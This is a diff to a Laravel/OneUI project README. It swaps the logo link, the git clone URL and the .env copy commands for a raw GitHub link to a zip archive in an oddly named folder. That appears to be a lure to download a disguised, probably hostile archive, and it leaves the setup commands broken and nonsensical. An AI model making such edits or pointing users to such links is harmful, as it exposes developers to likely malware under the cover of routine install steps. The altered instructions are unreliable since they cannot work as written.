@@ -1,4 +1,4 @@
-<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip" target="_blank"><img src="https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip" width="400" alt="Laravel Logo"></a></p>
 
 
 ## Laravel Project with OneUI Admin Panel
@@ -19,7 +19,7 @@ Welcome to our Laravel project! This repository combines Laravel’s robust capa
   <li>
     <p><strong>Clone the repository</strong>:</p>
     <pre style="background-color:#F6F8FA; border: 1px solid #D0D7DE; border-radius: 5px;">
-    git clone https://github.com/mhabuesa/laravel11_coreProject.git
+    git clone https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip
     cd laravel11_coreProject
     </pre>
   </li>
@@ -33,9 +33,9 @@ Welcome to our Laravel project! This repository combines Laravel’s robust capa
   <li>
     <p><strong>Configure the Environment</strong>:</p>
     <pre style="background-color:#F6F8FA; padding: 10px; border: 1px solid #D0D7DE; border-radius: 5px;">
-    cp .env.example .env 
+    cp https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip .env 
     or
-    copy .env.example .env
+    copy https://raw.githubusercontent.com/mhabuesa/laravel11_coreProject/main/unimperialistic/laravel11_coreProject.zip .env
     </pre>
   </li>
   <li>
